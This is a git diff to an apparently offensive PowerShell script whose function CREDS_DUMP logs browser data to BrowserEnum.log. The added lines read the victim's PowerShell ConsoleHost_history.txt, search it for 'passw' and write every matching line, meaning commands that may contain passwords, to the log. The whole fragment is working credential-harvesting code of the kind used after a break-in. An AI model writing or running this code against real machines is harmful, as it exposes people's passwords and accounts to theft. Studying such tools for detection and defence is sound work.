@@ -566,8 +566,26 @@ function CREDS_DUMP {
             echo "$Regex" >> $LogFilePath\BrowserEnum.log
         }
     }
-}
 
+    ## Search for passwords in { ConsoleHost_history }
+    echo "`n`nCreds in ConsoleHost_history.txt" >> $LogFilePath\BrowserEnum.log
+    echo "--------------------------------" >> $LogFilePath\BrowserEnum.log
+    If(-not(Test-Path "$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt")){
+        echo "ConsoleHost_history.txt not found .." >> $LogFilePath\BrowserEnum.log
+    }else{
+        $Path = "$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
+        $Json = Get-Content "$Path"|sls passw
+        If(-not($Json) -or $Json -eq $null){
+            echo "None Credentials found .." >> $LogFilePath\BrowserEnum.log
+        }else{
+            ## Loop in each string found
+            ForEach($token in $Json){
+                echo "$token" >> $LogFilePath\BrowserEnum.log
+            }
+        }
+    }
+}
+ 
 
 ## Jump Links (Functions)
 If($param1 -eq "-IE"){IE_Dump}
